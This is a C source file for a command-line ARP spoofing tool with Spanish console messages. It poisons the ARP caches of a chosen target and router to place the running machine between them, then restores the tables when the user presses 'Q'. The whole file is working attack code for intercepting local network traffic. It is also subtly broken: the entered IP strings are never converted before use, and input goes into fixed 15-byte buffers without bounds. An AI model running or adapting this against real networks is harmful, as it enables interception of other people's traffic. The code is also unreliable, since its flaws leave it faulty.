#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <sys/ioctl.h>
#include <net/if.h>

#include "functions.h"


int main() {
        char iface[IFNAMSIZ];
        char text_target_ip[15];
        char text_router_ip[15];
        uint32_t target_ip;
        uint32_t router_ip;
        printf("%sARP Spoofer (C) 2024 X-Leamsi%s\n\n", color(4), color_reset);
        printf("[%sIface%s]: ", color(2), color_reset);
        scanf("%s", iface);
        printf("[%sTarget IP%s]: ", color(2), color_reset);
        scanf("%s", text_target_ip);
        printf("[%sRouter IP%s]: ", color(2), color_reset);
        scanf("%s", text_router_ip);

        uint32_t local_ip = get_local_ip(iface);
        uint8_t * local_mac = get_local_mac(iface);

        printf("\n\n(%s***%s) %sInicinado Ataque de Susplantacion de las tablas ARP%s\n",
        color(4), color_reset, color(3), color_reset);

        printf("\n(%s***%s) IP de esta maquina: %s%s%s%s; MAC de esta maquina: %s%s%s%s;\n",
        color(4), color_reset, background(6), color(0), inet_ntoa(*(struct in_addr*)&local_ip), color_reset,
        background(6), color(0), mac_to_text(local_mac), color_reset);

        printf("\n(%s***%s) IP del Objetivo: %s%s%s%s; IP del Router: %s%s%s%s; Interfaz de Red: %s%s%s%s;\n",
        color(4), color_reset, background(6), color(0), text_target_ip, color_reset,
        background(6), color(0), text_router_ip, color_reset, background(6), color(0), iface, color_reset);

        uint8_t * target_mac = get_mac(local_mac, local_ip, target_ip, iface);
        uint8_t * router_mac = get_mac(local_mac, local_ip, router_ip, iface);

        printf("\n(%s***%s) MAC del Objetivo: %s%s%s%s; MAC del Router: %s%s%s%s;\n",
        color(4), color_reset, background(6), color(0), mac_to_text(target_mac), color_reset,
        background(6), color(0), mac_to_text(router_mac), color_reset);

        send_arp(local_mac, router_ip, target_mac, target_ip, iface);
        send_arp(local_mac, target_ip, router_mac, router_ip, iface);

        printf("\n\n(%s***%s) %sSusplantacion ARP iniciada%s\n",
        color(5), color_reset, color(1), color_reset);

        printf("Use [Q] para terminar ataque\n");
        while (getchar() != 'Q');

        send_arp(router_mac, router_ip, target_mac, target_ip, iface);
        send_arp(target_mac, target_ip, router_mac, router_ip, iface);
        printf("\n(%s***%s) %sAtaque tarminado%s\n",
        color(5), color_reset, color(2), color_reset);
        exit(EXIT_SUCCESS);
}


